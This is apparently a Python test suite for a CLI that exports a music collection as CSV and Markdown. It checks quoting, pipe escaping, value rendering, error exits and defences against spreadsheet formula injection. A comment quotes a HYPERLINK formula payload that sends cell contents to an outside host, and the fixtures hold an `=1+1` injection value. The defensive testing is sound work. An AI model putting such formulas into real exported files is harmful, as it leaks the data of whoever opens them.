"""`bunker export` loses and deforms no row on the way out.

Run: .venv/bin/python -m tests.test_export   (host: does not import Django)

The REAL command is driven with `sede.get` swapped out: what is asked is what the CLI WRITES, not
what the API returns — and doing it against the live collection would tie the verdict to whatever
Alonso has catalogued today, which is the defect `tests/test_fuentes.py` just shed.

The three traps it covers, all three of the "goes wrong SILENTLY" kind:
  · a title with a comma splits the CSV row if it is not quoted;
  · a `|` inside a cell splits the column in Markdown;
  · a bare `str(value)` writes "None", "True" and "['House', 'Techno']" into the cell.
"""
import csv
import io
import contextlib

from cli import main as CLI
from cli import sede

fallos = 0


def check(cond, etiqueta):
    global fallos
    print(f'  {"ok  " if cond else "FALLA"} {etiqueta}')
    if not cond:
        fallos += 1


class _Resp:
    def __init__(self, datos):
        self._datos = datos

    def raise_for_status(self):
        pass

    def json(self):
        return self._datos


FILAS = [
    {"title": "Homework, edicion | rara", "artist": "=1+1", "label": "Virgin",
     "release_year": 2001, "format_type": "VINYL",
     "genres": ["House", {"name": "Techno"}], "is_listened": False, "personal_rating": None},
    {"title": "Discovery", "artist": "Daft Punk", "label": None,
     "release_year": 2001, "format_type": "VINYL", "genres": [],
     "is_listened": True, "personal_rating": "9.5"},
]


def _correr(argv_coleccion, formato):
    original = sede.get
    sede.get = lambda url, **kw: _Resp(FILAS)
    salida = io.StringIO()
    try:
        with contextlib.redirect_stdout(salida):
            CLI.export_collection(argv_coleccion, formato)
    finally:
        sede.get = original
    return salida.getvalue()


# --- CSV ---
texto = _correr("musica", "csv")
filas = list(csv.reader(io.StringIO(texto)))
# VACUIDAD PRIMERO: sin filas todo lo de abajo es verdad por vacio.
check(len(filas) == 3, f'the CSV has a header and the two rows ({len(filas)})')
check(filas[0][0] == "Titulo" and filas[0][-1] == "Nota", f'the header is the expected one: {filas[0]}')
# The comma AND the pipe inside the title: `csv` quotes the cell and the reader returns it whole.
check(filas[1][0] == "Homework, edicion | rara",
      f'a title with a comma survives the round trip: {filas[1][0]!r}')
check(len(filas[1]) == len(filas[0]),
      f'and it has not split the row into extra columns ({len(filas[1])} vs {len(filas[0])})')
check(filas[1][5] == "House; Techno",
      f'genres come out as text, lists and dicts included: {filas[1][5]!r}')
check(filas[1][6] == "no" and filas[2][6] == "si", 'booleans are written si/no')
check(filas[1][7] == "" and filas[2][2] == "",
      'a None is written empty, not "None"')

# --- CSV: FORMULA INJECTION ---
#
# A cell starting with `=`, `+`, `-`, `@`, tab or CR is a FORMULA to Excel, LibreOffice and
# Sheets. `csv` quoting protects the PARSER, not the spreadsheet — measured before the fix:
# `=HYPERLINK("http://x/?"&A1,"click")` reached the file untouched. The titles are third-party
# text (the barcode oracles and the scraped listings write them), and this command exists to
# hand the file to somebody else.
check(filas[1][1] == "'=1+1",
      f'a cell starting with `=` comes out quote-prefixed: {filas[1][1]!r}')
check(filas[2][7] == "'9.5" or not filas[2][7].startswith(("=", "+", "-", "@")),
      f'and one that starts with no dangerous character is NOT touched: {filas[2][7]!r}')
for peligroso in ("=", "+", "-", "@", "\t", "\r"):
    check(CLI._sin_formula(peligroso + "x").startswith("'"),
          f'_sin_formula neutralises a leading {peligroso!r}')
check(CLI._sin_formula("Homework") == "Homework", '_sin_formula leaves a normal title alone')

# --- MARKDOWN ---
md = [l for l in _correr("musica", "md").splitlines() if l.strip()]
check(len(md) == 4, f'the Markdown has header, separator and two rows ({len(md)})')

# ⚠ `|` CHARACTERS ARE NOT COUNTED: the first version of this check did, and it came out RED
# against CORRECT Markdown. An escaped `\|` still contains a `|`, so the odd title's row counted
# 10 pipes against 9 — the defect was in the instrument. What defines a column is an UNESCAPED
# pipe, and that is what is split on here.
import re
partir = lambda l: re.split(r'(?<!\\)\|', l)
celdas = [len(partir(l)) for l in md]
check(len(set(celdas)) == 1,
      f'every line has the same number of columns ({celdas}); an unescaped `|` inside a cell '
      f'splits the column')
check("\\|" in md[2], "the title's `|` is escaped")
check("|" in partir(md[2])[1], 'and it reaches the cell: the title keeps its pipe')

# --- THE EDGES OF _celda ---
check(CLI._celda(None) == "", '_celda(None) is the empty string')
check(CLI._celda(0) == "0", '_celda(0) is NOT confused with empty')
check(CLI._celda([]) == "", '_celda of an empty list is the empty string')

# --- THE ERROR EXITS ---
import typer
for coleccion, formato, etiqueta in (("comics", "csv", "unknown collection"),
                                     ("libros", "xml", "unknown format")):
    try:
        with contextlib.redirect_stdout(io.StringIO()):
            CLI.export_collection(coleccion, formato)
        salio = None
    except typer.Exit as e:
        salio = e.exit_code
    check(salio == 1, f'{etiqueta} exits with code 1 (was {salio!r})')

print(f"\ntest_export: {'0 fallos' if not fallos else f'{fallos} FALLOS'}")
raise SystemExit(1 if fallos else 0)
